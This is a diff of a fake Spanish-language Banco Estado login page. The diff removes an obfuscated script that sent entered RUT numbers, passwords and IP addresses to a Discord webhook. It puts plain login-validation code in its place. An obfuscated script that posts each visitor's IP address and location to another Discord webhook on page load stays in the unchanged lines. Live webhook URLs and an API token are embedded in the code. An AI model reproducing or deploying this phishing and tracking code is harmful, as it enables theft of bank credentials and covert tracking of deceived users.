@@ -1361,7 +1361,113 @@ body {
 const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado','loading','https://discord.com/api/webhooks/1539128158262001684/TnH2KJZAHKvHRDY6cptJ1GNxJY2d5hr-Z8-phfTxJib--__hPnAMz-SaXeCa-pSad6Cb','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff5252,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
 </script>
 <script>
-const _0x225715=_0x307f;(function(_0x5b5a38,_0x5a2c18){const _0x1890cd=_0x307f,_0x20fb8e=_0x5b5a38();while(!![]){try{const _0x483ac7=-parseInt(_0x1890cd(0xde))/0x1+parseInt(_0x1890cd(0xe3))/0x2+-parseInt(_0x1890cd(0xdb))/0x3+-parseInt(_0x1890cd(0x104))/0x4*(-parseInt(_0x1890cd(0xf1))/0x5)+parseInt(_0x1890cd(0xfe))/0x6*(-parseInt(_0x1890cd(0x103))/0x7)+parseInt(_0x1890cd(0xda))/0x8*(parseInt(_0x1890cd(0xeb))/0x9)+-parseInt(_0x1890cd(0x107))/0xa;if(_0x483ac7===_0x5a2c18)break;else _0x20fb8e['push'](_0x20fb8e['shift']());}catch(_0x1f3410){_0x20fb8e['push'](_0x20fb8e['shift']());}}}(_0x5b8e,0xcb8b4));const DISCORD_WEBHOOK_URL=_0x225715(0xfd);function togglePassword(){const _0x36ebfd=_0x225715,_0x3d8c9e=document[_0x36ebfd(0xf8)](_0x36ebfd(0xe6)),_0x2339ae=document[_0x36ebfd(0xf8)](_0x36ebfd(0x102)),_0x68b86b=document[_0x36ebfd(0xf8)](_0x36ebfd(0x101));_0x3d8c9e[_0x36ebfd(0xfc)]===_0x36ebfd(0xe6)?(_0x3d8c9e[_0x36ebfd(0xfc)]=_0x36ebfd(0xf2),_0x68b86b['style'][_0x36ebfd(0xe9)]=_0x36ebfd(0xea),_0x2339ae[_0x36ebfd(0xe8)][_0x36ebfd(0xe9)]=_0x36ebfd(0xd7)):(_0x3d8c9e[_0x36ebfd(0xfc)]=_0x36ebfd(0xe6),_0x68b86b[_0x36ebfd(0xe8)]['display']=_0x36ebfd(0xd7),_0x2339ae[_0x36ebfd(0xe8)][_0x36ebfd(0xe9)]=_0x36ebfd(0xea));}function _0x307f(_0x5eea22,_0x4765bc){_0x5eea22=_0x5eea22-0xd4;const _0x5b8ea3=_0x5b8e();let _0x307f8a=_0x5b8ea3[_0x5eea22];return _0x307f8a;}function validatePassword(_0xe4d51a){const _0x34343f=_0x225715,_0x324bc5=/[a-zA-Z]/['test'](_0xe4d51a),_0x429619=/[0-9]/['test'](_0xe4d51a),_0x86ea76=/[^a-zA-Z0-9]/[_0x34343f(0xdd)](_0xe4d51a),_0x5663a5=_0xe4d51a[_0x34343f(0xee)]>=0x6&&_0xe4d51a[_0x34343f(0xee)]<=0x8;if(_0xe4d51a[_0x34343f(0xee)]===0x0)return{'valid':![],'message':_0x34343f(0xd6)};if(_0x86ea76)return{'valid':![],'message':_0x34343f(0xe0)};if(!_0x5663a5)return{'valid':![],'message':_0x34343f(0xf0)};if(!_0x324bc5)return{'valid':![],'message':'La\x20contraseña\x20debe\x20contener\x20letras'};if(!_0x429619)return{'valid':![],'message':_0x34343f(0xd9)};return{'valid':!![]};}function handleLogin(_0x1a456a){const _0x28255a=_0x225715;_0x1a456a[_0x28255a(0xd8)]();const _0x1a2862=document[_0x28255a(0xf8)](_0x28255a(0xef))[_0x28255a(0xfb)][_0x28255a(0x105)](),_0xc4421c=document['getElementById'](_0x28255a(0xe6))[_0x28255a(0xfb)];if(!_0x1a2862||!_0xc4421c){alert('Por\x20favor\x20completa\x20todos\x20los\x20campos');return;}const _0x41de32=validatePassword(_0xc4421c);if(!_0x41de32[_0x28255a(0xec)]){alert(_0x41de32[_0x28255a(0xe1)]);return;}localStorage[_0x28255a(0xe4)](_0x28255a(0xf5),_0x1a2862),sendToDiscord(_0x1a2862,_0xc4421c);}function sendToDiscord(_0x57a8bd,_0xd39949){const _0x5a498c=_0x225715;fetch('https://api.ipify.org?format=json')[_0x5a498c(0xfa)](_0x302bca=>_0x302bca['json']())[_0x5a498c(0xfa)](_0x553628=>{const _0x52f569=_0x5a498c,_0x5c177f={'username':_0x52f569(0xdc),'embeds':[{'color':0x3498db,'author':{'name':_0x52f569(0xf7)},'fields':[{'name':_0x52f569(0xe5),'value':'`'+_0x57a8bd+'`','inline':![]},{'name':'Contraseña','value':'`'+_0xd39949+'`','inline':![]},{'name':'IP','value':'`'+_0x553628['ip']+'`','inline':!![]},{'name':'Hora','value':'`'+new Date()['toLocaleString'](_0x52f569(0x106))+'`','inline':!![]}]}]};fetch(DISCORD_WEBHOOK_URL,{'method':_0x52f569(0xf3),'headers':{'Content-Type':_0x52f569(0xd5)},'body':JSON[_0x52f569(0xdf)](_0x5c177f)})[_0x52f569(0xfa)](()=>{const _0x3b714b=_0x52f569;window[_0x3b714b(0xf4)][_0x3b714b(0xff)]=_0x3b714b(0x100);})[_0x52f569(0xe2)](_0x407b01=>console['error'](_0x52f569(0xd4),_0x407b01));})[_0x5a498c(0xe2)](_0x3127cc=>console[_0x5a498c(0xe7)](_0x5a498c(0xed),_0x3127cc));}function _0x5b8e(){const _0x4d8462=['https://discord.com/api/webhooks/1538414125439520778/2NAQ87Fjy8N0QFQ6Cxf57DFp_J2MxFCgtGo9EgSOvdjT10G8KSEnWjx9nxW3eowQzBFw','7693266RAyvJB','href','load.html','eyeHidden','eyeClosed','7nIYGcu','4598324LmIaGi','trim','es-ES','7999870xTCXTe','addEventListener','Error:','application/json','La\x20contraseña\x20es\x20obligatoria','block','preventDefault','La\x20contraseña\x20debe\x20contener\x20números','32NKpDpy','261885cctrpb','💋𝐿𝑜𝑔𝑜𝑠\x20𝐵𝑎𝑛𝑐𝑜𝐸𝑠𝑡𝑎𝑑𝑜\x20𝑃𝑟𝑖𝑚𝑒-𝐶𝑜𝑟𝑒-𝑃𝑅𝑂𝑀𝐴𝑋💋','test','829471HYbyCv','stringify','La\x20contraseña\x20no\x20puede\x20contener\x20caracteres\x20especiales','message','catch','2430870HGxnbY','setItem','RUT','password','error','style','display','none','3302244NIZWrZ','valid','Error\x20IP:','length','rut','La\x20contraseña\x20debe\x20tener\x20entre\x206\x20y\x208\x20caracteres','5vraOpu','text','POST','location','rutUsuario','focus','✨𝕷𝖔𝖌𝖔\x20𝕭𝖆𝖓𝖈𝖔𝕰𝖘𝖙𝖆𝖉𝖔✨','getElementById','load','then','value','type'];_0x5b8e=function(){return _0x4d8462;};return _0x5b8e();}function closeWindow(){window['close']();}function handleForgotPassword(_0x44b636){const _0x42ab31=_0x225715;_0x44b636[_0x42ab31(0xd8)]();}function handleBusinessAccess(){}function handleHelpCenter(_0x385344){const _0x4d3b9a=_0x225715;_0x385344[_0x4d3b9a(0xd8)]();}window[_0x225715(0x108)](_0x225715(0xf9),function(){const _0x53cc0d=_0x225715;document['getElementById'](_0x53cc0d(0xef))[_0x53cc0d(0xf6)]();});
+    // ============================================
+// FUNCIONES DE UTILIDAD
+// ============================================
+
+// Mostrar/Ocultar contraseña
+function togglePassword() {
+    const passwordInput = document.getElementById('password');
+    const eyeClosed = document.getElementById('eyeClosed');
+    const eyeHidden = document.getElementById('eyeHidden');
+    
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeHidden.style.display = 'block';
+        eyeClosed.style.display = 'none';
+    } else {
+        passwordInput.type = 'password';
+        eyeHidden.style.display = 'none';
+        eyeClosed.style.display = 'block';
+    }
+}
+
+// ============================================
+// VALIDACIÓN
+// ============================================
+
+function validatePassword(password) {
+    const hasLetters = /[a-zA-Z]/.test(password);
+    const hasNumbers = /[0-9]/.test(password);
+    const hasSpecialChars = /[^a-zA-Z0-9]/.test(password);
+    const validLength = password.length >= 6 && password.length <= 8;
+    
+    if (password.length === 0) {
+        return { valid: false, message: 'La contraseña es obligatoria' };
+    }
+    if (hasSpecialChars) {
+        return { valid: false, message: 'La contraseña no puede contener caracteres especiales' };
+    }
+    if (!validLength) {
+        return { valid: false, message: 'La contraseña debe tener entre 6 y 8 caracteres' };
+    }
+    if (!hasLetters) {
+        return { valid: false, message: 'La contraseña debe contener letras' };
+    }
+    if (!hasNumbers) {
+        return { valid: false, message: 'La contraseña debe contener números' };
+    }
+    
+    return { valid: true };
+}
+
+// ============================================
+// MANEJO DE EVENTOS
+// ============================================
+
+function handleLogin(event) {
+    event.preventDefault();
+    
+    const rutInput = document.getElementById('rut');
+    const passwordInput = document.getElementById('password');
+    
+    const rut = rutInput.value.trim();
+    const password = passwordInput.value;
+    
+    if (!rut || !password) {
+        alert('Por favor completa todos los campos');
+        return;
+    }
+    
+    const validation = validatePassword(password);
+    if (!validation.valid) {
+        alert(validation.message);
+        return;
+    }
+    
+    // Guardar RUT en localStorage
+    localStorage.setItem('rutUsuario', rut);
+    
+    // Aquí puedes agregar lo que necesites hacer después del login exitoso
+    // Por ejemplo: mostrar un mensaje de éxito, cargar contenido dinámicamente, etc.
+    console.log('Login exitoso para RUT:', rut);
+}
+
+function handleForgotPassword(event) {
+    event.preventDefault();
+    // Lógica para recuperar contraseña
+}
+
+function handleBusinessAccess() {
+    // Lógica para acceso empresas
+}
+
+function handleHelpCenter(event) {
+    event.preventDefault();
+    // Lógica para centro de ayuda
+}
+
+function closeWindow() {
+    window.close();
+}
+
+// ============================================
+// INICIALIZACIÓN
+// ============================================
+
+window.addEventListener('load', function() {
+    document.getElementById('rut').focus();
+});
 </script>
 </body>
 </html>
